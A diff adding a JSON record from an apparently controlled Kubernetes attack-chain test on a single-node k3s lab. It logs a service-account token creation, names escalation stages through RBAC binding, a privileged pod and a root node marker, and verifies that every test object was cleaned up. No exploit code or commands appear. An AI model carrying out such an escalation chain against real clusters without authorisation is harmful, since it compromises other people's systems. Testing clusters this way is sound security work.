+      "at": 1792948630.5933976,
+      "sha256": "a315fe43c34b4ff8d05cee669dd931cddfa2bce035aa73f34d3cb61d1752d6b5"
+    },
+    {
+      "stage": "stage-2-credential",
+      "verb": "create",
+      "resource": "serviceaccounts/token",
+      "namespace": "trident-killchain",
+      "name": "trident-operator",
+      "result": "{\"fingerprint\":{\"last4\":\"XCdg\",\"length\":989,\"sha256_prefix\":\"626a7a9be1047acd\"}}",
+      "mutates": false,
+      "at": 1792948631.3178806,
+      "sha256": "d428c3d73fe86898b5db61d525241b45b3ac8b680b0ac4c1cce6d6da2d5a20f5"
+    }
+  ],
+  "cleanup": {
+    "verified": true,
+    "checks": [
+      {
+        "check": "node marker",
+        "path": "/root/TRIDENT-PROOF-real-20261026-10",
+        "ok": true,
+        "observed": "absent"
+      },
+      {
+        "check": "namespace trident-proof-real-20261026-10 absent",
+        "ok": true,
+        "observed": "absent"
+      },
+      {
+        "check": "clusterrolebinding trident-pwn-crb-real-20261026-10 absent",
+        "ok": true,
+        "observed": "absent"
+      },
+      {
+        "check": "rolebinding trident-pwn-rb-real-20261026-10 absent",
+        "ok": true,
+        "observed": "absent"
+      },
+      {
+        "check": "pod trident-pwn-pod-real-20261026-10 absent",
+        "ok": true,
+        "observed": "absent"
+      },
+      {
+        "check": "fixture-clusterrolebinding trident-operator-broad absent",
+        "ok": true,
+        "observed": "absent"
+      },
+      {
+        "check": "fixture-clusterrole trident-operator-broad absent",
+        "ok": true,
+        "observed": "absent"
+      },
+      {
+        "check": "fixture-namespace trident-killchain absent",
+        "ok": true,
+        "observed": "absent"
+      },
+      {
+        "check": "namespace set equals baseline",
+        "ok": true,
+        "observed": {
+          "expected": [
+            "default",
+            "kube-node-lease",
+            "kube-public",
+            "kube-system",
+            "trident-proof"
+          ],
+          "actual": [
+            "default",
+            "kube-node-lease",
+            "kube-public",
+            "kube-system",
+            "trident-proof"
+          ]
+        }
+      },
+      {
+        "check": "secret name set equals baseline",
+        "ok": true,
+        "observed": {
+          "expected_count": 2,
+          "actual_count": 2,
+          "delta": []
+        }
+      },
+      {
+        "check": "no objective clusterrolebinding",
+        "ok": true,
+        "observed": []
+      }
+    ],
+    "residue": [],
+    "baseline": {
+      "namespaces": [
+        "default",
+        "kube-node-lease",
+        "kube-public",
+        "kube-system",
+        "trident-killchain",
+        "trident-proof"
+      ],
+      "secrets": [
+        {
+          "namespace": "kube-system",
+          "name": "k3s-serving",
+          "type": "kubernetes.io/tls"
+        },
+        {
+          "namespace": "kube-system",
+          "name": "k3s.node-password.k3s",
+          "type": "k3s.cattle.io/node-password"
+        }
+      ],
+      "clusterrolebindings": [
+        "cluster-admin",
+        "clustercidrs-node",
+        "k3s-cloud-controller-manager",
+        "k3s-cloud-controller-manager-auth-delegator",
+        "kube-apiserver-kubelet-admin",
+        "local-path-provisioner-bind",
+        "system:basic-user",
+        "system:controller:attachdetach-controller",
+        "system:controller:certificate-controller",
+        "system:controller:clusterrole-aggregation-controller",
+        "system:controller:cronjob-controller",
+        "system:controller:daemon-set-controller",
+        "system:controller:deployment-controller",
+        "system:controller:device-taint-eviction-controller",
+        "system:controller:disruption-controller",
+        "system:controller:endpoint-controller",
+        "system:controller:endpointslice-controller",
+        "system:controller:endpointslicemirroring-controller",
+        "system:controller:ephemeral-volume-controller",
+        "system:controller:expand-controller",
+        "system:controller:generic-garbage-collector",
+        "system:controller:horizontal-pod-autoscaler",
+        "system:controller:job-controller",
+        "system:controller:legacy-service-account-token-cleaner",
+        "system:controller:namespace-controller",
+        "system:controller:node-controller",
+        "system:controller:persistent-volume-binder",
+        "system:controller:pod-garbage-collector",
+        "system:controller:pv-protection-controller",
+        "system:controller:pvc-protection-controller",
+        "system:controller:replicaset-controller",
+        "system:controller:replication-controller",
+        "system:controller:resource-claim-controller",
+        "system:controller:resourcequota-controller",
+        "system:controller:root-ca-cert-publisher",
+        "system:controller:route-controller",
+        "system:controller:selinux-warning-controller",
+        "system:controller:service-account-controller",
+        "system:controller:service-cidrs-controller",
+        "system:controller:service-controller",
+        "system:controller:statefulset-controller",
+        "system:controller:ttl-after-finished-controller",
+        "system:controller:ttl-controller",
+        "system:controller:validatingadmissionpolicy-status-controller",
+        "system:controller:volumeattributesclass-protection-controller",
+        "system:coredns",
+        "system:discovery",
+        "system:k3s-controller",
+        "system:kube-controller-manager",
+        "system:kube-dns",
+        "system:kube-scheduler",
+        "system:monitoring",
+        "system:node",
+        "system:node-proxier",
+        "system:public-info-viewer",
+        "system:service-account-issuer-discovery",
+        "system:volume-scheduler",
+        "trident-operator-broad"
+      ],
+      "captured_at": 1792948629.9046457
+    },
+    "fixture_cleanup": true,
+    "generated_at": 1792948702.4246917,
+    "receipt": "objective-cleanup.json"
+  },
+  "baseline": {
+    "namespaces": [
+      "default",
+      "kube-node-lease",
+      "kube-public",
+      "kube-system",
+      "trident-killchain",
+      "trident-proof"
+    ],
+    "secrets": [
+      {
+        "namespace": "kube-system",
+        "name": "k3s-serving",
+        "type": "kubernetes.io/tls"
+      },
+      {
+        "namespace": "kube-system",
+        "name": "k3s.node-password.k3s",
+        "type": "k3s.cattle.io/node-password"
+      }
+    ],
+    "clusterrolebindings": [
+      "cluster-admin",
+      "clustercidrs-node",
+      "k3s-cloud-controller-manager",
+      "k3s-cloud-controller-manager-auth-delegator",
+      "kube-apiserver-kubelet-admin",
+      "local-path-provisioner-bind",
+      "system:basic-user",
+      "system:controller:attachdetach-controller",
+      "system:controller:certificate-controller",
+      "system:controller:clusterrole-aggregation-controller",
+      "system:controller:cronjob-controller",
+      "system:controller:daemon-set-controller",
+      "system:controller:deployment-controller",
+      "system:controller:device-taint-eviction-controller",
+      "system:controller:disruption-controller",
+      "system:controller:endpoint-controller",
+      "system:controller:endpointslice-controller",
+      "system:controller:endpointslicemirroring-controller",
+      "system:controller:ephemeral-volume-controller",
+      "system:controller:expand-controller",
+      "system:controller:generic-garbage-collector",
+      "system:controller:horizontal-pod-autoscaler",
+      "system:controller:job-controller",
+      "system:controller:legacy-service-account-token-cleaner",
+      "system:controller:namespace-controller",
+      "system:controller:node-controller",
+      "system:controller:persistent-volume-binder",
+      "system:controller:pod-garbage-collector",
+      "system:controller:pv-protection-controller",
+      "system:controller:pvc-protection-controller",
+      "system:controller:replicaset-controller",
+      "system:controller:replication-controller",
+      "system:controller:resource-claim-controller",
+      "system:controller:resourcequota-controller",
+      "system:controller:root-ca-cert-publisher",
+      "system:controller:route-controller",
+      "system:controller:selinux-warning-controller",
+      "system:controller:service-account-controller",
+      "system:controller:service-cidrs-controller",
+      "system:controller:service-controller",
+      "system:controller:statefulset-controller",
+      "system:controller:ttl-after-finished-controller",
+      "system:controller:ttl-controller",
+      "system:controller:validatingadmissionpolicy-status-controller",
+      "system:controller:volumeattributesclass-protection-controller",
+      "system:coredns",
+      "system:discovery",
+      "system:k3s-controller",
+      "system:kube-controller-manager",
+      "system:kube-dns",
+      "system:kube-scheduler",
+      "system:monitoring",
+      "system:node",
+      "system:node-proxier",
+      "system:public-info-viewer",
+      "system:service-account-issuer-discovery",
+      "system:volume-scheduler",
+      "trident-operator-broad"
+    ],
+    "captured_at": 1792948629.9046457
+  },
+  "hardware_gates": [
+    {
+      "id": "switch-fabric",
+      "status": "read-only-version-gate",
+      "max_action": "只读",
+      "reason": "无物理交换机/带外管理访问；以版本矩阵与只读证据代替，不执行硬件写入"
+    },
+    {
+      "id": "bmc-oob",
+      "status": "read-only-version-gate",
+      "max_action": "只读",
+      "reason": "不触达 BMC/带外控制面；仅登记版本与暴露面证据"
+    }
+  ],
+  "privesc": {
+    "status": "unavailable",
+    "reason": "backend 未暴露 state 快照；使用 objective_chain 的 stage-3 引擎",
+    "fallback": "stage-3-rbac-escalation"
+  },
+  "limits": [
+    "单节点 QEMU/TCG k3s（非生产规模；无 HA/多节点调度验证）",
+    "硬件/交换机/带外阶段仅版本闸门 + 只读，不执行硬件写入",
+    "secret 仅列举名称，不读取 value；token 仅记录 sha256 前缀与尾 4 位"
+  ],
+  "artifacts": {
+    "proof": "objective-proof.json",
+    "cleanup_receipt": "objective-cleanup.json",
+    "screenshot": null
+  },
+  "hashes": {
+    "stage_artifacts": {
+      "stage-1-entry": "a3d42b1dbf65330bc085c2d30d71ce3bea6aee9245c6b43c8a25402f53c88e84",
+      "stage-2-credential": "99df02d8d5b8253ce50b2cec941a1d4a6b2af62ca171df9321c1c8797499601f",
+      "stage-3-rbac-escalation": "57694216f88eac4a4238835628ecca3832895d835752f1220e94b13ac31be8e9",
+      "stage-4-privileged-pod": "270d4c33f4b7189add78cb2a8a895353b9ad841cb81c55fa522a6433b2c6ca95",
+      "stage-5-node-marker": "ba7d35d238d7de7e200e9e32fd4baf479f1d3afe9e4f21e0ef184e614dd9c409",
+      "stage-6-cluster-proof": "53550568fdfae994bd7723d2adbeb9df079c3890e0f48777805b1a537ef9522d",
+      "stage-7-cleanup": "3775120b8ad947e12c952e3c61d36cb74cfae7ee7b2d4c9162ee916d4255ee81"
+    },
+    "actions_sha256": "17d1532aedee58b9ce74da84afad981c6a1d2b9320db7d7244bd1afbae3e0fbe",
+    "baseline_sha256": "07c2979ff2e6b20bc4b558d5d00a2a58f806e2066dd2344bad70c4169f97ac49",
+    "manifest_sha256_at_proof": "8024e1b9603a03da2a6b98d9aeaf527b84a54d728184234a74a8cf228bbcf095",
+    "proof_sha256": "1617a34f7061126bb94270f3745096c5f827962844fcdb187cf8261080ec2c94"
+  }
+}
